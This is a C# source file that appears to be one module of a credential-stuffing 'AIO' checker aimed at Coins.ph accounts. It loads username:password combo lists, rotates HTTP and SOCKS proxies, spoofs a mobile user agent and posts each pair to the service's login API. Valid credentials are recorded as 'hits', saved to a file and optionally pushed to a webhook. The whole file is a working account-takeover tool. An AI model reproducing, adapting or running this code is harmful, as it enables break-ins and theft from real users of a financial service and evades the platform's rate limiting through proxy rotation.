using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class coinsphmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Linux; Android 5.1.1; SM-N950N Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Accept", "application/json, text/plain, */*");
                            var post = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] +
                                       "\",\"region\":\"ph\"}";
                            var text2 = req.Post("https://api.coins.asia/v5/jwt/login", post,
                                "application/json;charset=UTF-8").ToString();
                            var flag7 = text2.Contains("{\"token\":\"") || text2.Contains("csrftoken");

                            if (flag7)
                            {
                                Program.Hits++;
                                Program.TotalChecks++;
                                if (Program.lorc == "LOG") Settings.PrintHit("Coins.ph", array[0] + ":" + array[1]);
                                Export.AsResult("/Coins.ph_hits", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Coins.ph Hits");
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}